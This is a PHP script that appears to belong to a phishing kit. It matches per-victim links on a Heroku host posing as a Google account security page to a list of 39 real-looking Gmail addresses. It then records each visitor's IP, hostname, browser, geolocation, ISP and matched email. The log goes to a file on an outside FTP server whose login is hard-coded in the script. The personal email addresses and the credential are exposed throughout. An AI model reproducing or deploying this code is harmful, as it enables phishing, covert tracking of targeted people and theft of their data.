<?php
$vinculo = $_GET['vinculo'];


$url = array(
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?00",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?01",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?02",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?03",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?04",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?05",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?06",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?07",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?08",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?09",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?10",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?11",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?12",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?13",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?14",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?15",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?16",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?17",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?18",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?19",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?20",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?21",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?22",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?23",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?24",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?25",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?26",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?27",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?28",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?29",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?30",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?31",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?32",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?33",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?34",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?35",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?36",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?37",
"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?38"
);



$correo = array(
"rojo.alac@gmail.com",
"elvisrodriguezs94@gmail.com",
"castilloanya@gmail.com",
"soral.92v@gmail.com",
"elevangelistadecristo1998@gmail.com",
"rodriguezma45@gmail.com",
"plinio9410@gmail.com",
"ganadesdelaweb@gmail.com",
"eltabogarcia@gmail.com",
"alvarezcristhofher4@gmail.com",
"laar1984@gmail.com",
"HIPICAPASION@GMAIL.COM",
"briianjj2016@gmail.com",
"consultorsha@gmail.com",
"yelitzondavid.ft@gmail.com",
"osothor66@gmail.com",
"alexander1x33@gmail.com",
"jackzius@gmail.com",
"tdarquitec@gmail.com",
"yorlis.tovar@gmail.com",
"verdugo838@gmail.com",
"agcoinss@gmail.com",
"aleelpran2011@gmail.com",
"mariaenriquetaalvarez1@gmail.com",
"rojascastro.ma@gmail.com",
"leopoldomagallanes@gmail.com",
"marcomirque@gmail.com",
"RUALCA04@GMAIL.COM",
"gilberlys1996@gmail.com",
"sergioivacevedo@gmail.com",
"acsuayo@gmail.com",
"ganadineroenrublos2018@gmail.com",
"jesus.erazo.mj@gmail.com",
"yaliana.tv@gmail.com",
"df.beats.25@gmail.com",
"diazmarwin@gmail.com",
"mejiasleonet@gmail.com",
"rafaelq.sistemas@gmail.com",
"jo.25el.26@gmail.com"
);


$vinculo = str_replace($url[0], $correo[0], $vinculo);
$vinculo = str_replace($url[1], $correo[1], $vinculo);
$vinculo = str_replace($url[2], $correo[2], $vinculo);
$vinculo = str_replace($url[3], $correo[3], $vinculo);
$vinculo = str_replace($url[4], $correo[4], $vinculo);
$vinculo = str_replace($url[5], $correo[5], $vinculo);
$vinculo = str_replace($url[6], $correo[6], $vinculo);
$vinculo = str_replace($url[7], $correo[7], $vinculo);
$vinculo = str_replace($url[8], $correo[8], $vinculo);
$vinculo = str_replace($url[9], $correo[9], $vinculo);
$vinculo = str_replace($url[10], $correo[10], $vinculo);
$vinculo = str_replace($url[11], $correo[11], $vinculo);
$vinculo = str_replace($url[12], $correo[12], $vinculo);
$vinculo = str_replace($url[13], $correo[13], $vinculo);
$vinculo = str_replace($url[14], $correo[14], $vinculo);
$vinculo = str_replace($url[15], $correo[15], $vinculo);
$vinculo = str_replace($url[16], $correo[16], $vinculo);
$vinculo = str_replace($url[17], $correo[17], $vinculo);
$vinculo = str_replace($url[18], $correo[18], $vinculo);
$vinculo = str_replace($url[19], $correo[19], $vinculo);
$vinculo = str_replace($url[20], $correo[20], $vinculo);
$vinculo = str_replace($url[21], $correo[21], $vinculo);
$vinculo = str_replace($url[22], $correo[22], $vinculo);
$vinculo = str_replace($url[23], $correo[23], $vinculo);
$vinculo = str_replace($url[24], $correo[24], $vinculo);
$vinculo = str_replace($url[25], $correo[25], $vinculo);
$vinculo = str_replace($url[26], $correo[26], $vinculo);
$vinculo = str_replace($url[27], $correo[27], $vinculo);
$vinculo = str_replace($url[28], $correo[28], $vinculo);
$vinculo = str_replace($url[29], $correo[29], $vinculo);
$vinculo = str_replace($url[30], $correo[30], $vinculo);
$vinculo = str_replace($url[31], $correo[31], $vinculo);
$vinculo = str_replace($url[32], $correo[32], $vinculo);
$vinculo = str_replace($url[33], $correo[33], $vinculo);
$vinculo = str_replace($url[34], $correo[34], $vinculo);
$vinculo = str_replace($url[35], $correo[35], $vinculo);
$vinculo = str_replace($url[36], $correo[36], $vinculo);
$vinculo = str_replace($url[37], $correo[37], $vinculo);
$vinculo = str_replace($url[38], $correo[38], $vinculo);

date_default_timezone_set('America/Caracas');
@ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['HTTP_X_FORWARDED_FOR']}/json"));
@ $hostname=gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
@ $fileHandle = fopen($outputWebBug, "a");
$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$hostname = gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
$navegador = $_SERVER['HTTP_USER_AGENT'];
$time = time();
$f = fopen("ftp://openresults:qwertyuiop@files.000webhost.com/public_html/1/mail.html", "a");
fwrite ($f, '<font color="#A4A4A4">Direccion IP </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$ip.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Nombre del Host </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$hostname.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Navegador y O.S </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$navegador.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Coordenadas </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->loc.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">PSI </font>&nbsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->org.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Ciudad </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->city.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Estado </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->region.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Pais </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->country.'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Fecha </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.date("D dS M, Y h:i a").'</font><br>');
fwrite ($f, '<font color="#A4A4A4">Correo </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#39ba48">'.$vinculo.'</font><br>');
fwrite ($f, '<font color="#A4A4A4"><br><br><hr><br><br>');
fclose($f);
exit;
?>
